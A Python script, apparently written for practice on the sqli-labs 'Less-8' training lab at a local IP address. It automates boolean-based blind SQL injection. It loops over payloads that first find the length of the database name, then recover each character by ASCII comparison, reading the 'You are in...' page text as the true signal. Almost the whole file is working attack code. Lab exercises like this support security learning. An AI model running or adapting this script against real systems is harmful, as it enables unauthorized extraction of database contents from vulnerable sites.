import requests

requests.adapters.DEFAULT_RETRIES = 5  # 增加重连次数
conn = requests.session()  # 建立请求会话

conn.keep_alive = False  # 关闭了持久连接。持久连接是HTTP 1.1的一个特性，它允许在同一个TCP连接中发送多个HTTP请求。关闭持久连接意味着每个请求都会创建一个新的TCP连接。
flag = 'You are in...'


def GetDBName(url):
    DBName = ''
    print("开始获取数据库名长度...")
    len = 0
    for len in range(1, 99):
        payload = f"' and length((select database()))={len}--+"
        res = conn.get(url=url+payload)
        if flag in res.content.decode("utf-8"):
            print("数据库名长度为："+str(len))
            length = len
            break
    print("开始获取数据库名...")
    for i in range(1, length+1):
        for j in range(33, 127):
            payload = f"' and ascii(substr((select database()),{i},1))={j}--+"
            res = conn.get(url=url+payload)
            if flag in res.content.decode("utf-8"):
                DBName += chr(j)
                print(DBName)
                break
    # 可以优化为二分法
    return DBName


GetDBName("http://192.168.216.131/sqli-labs/Less-8/?id=1")
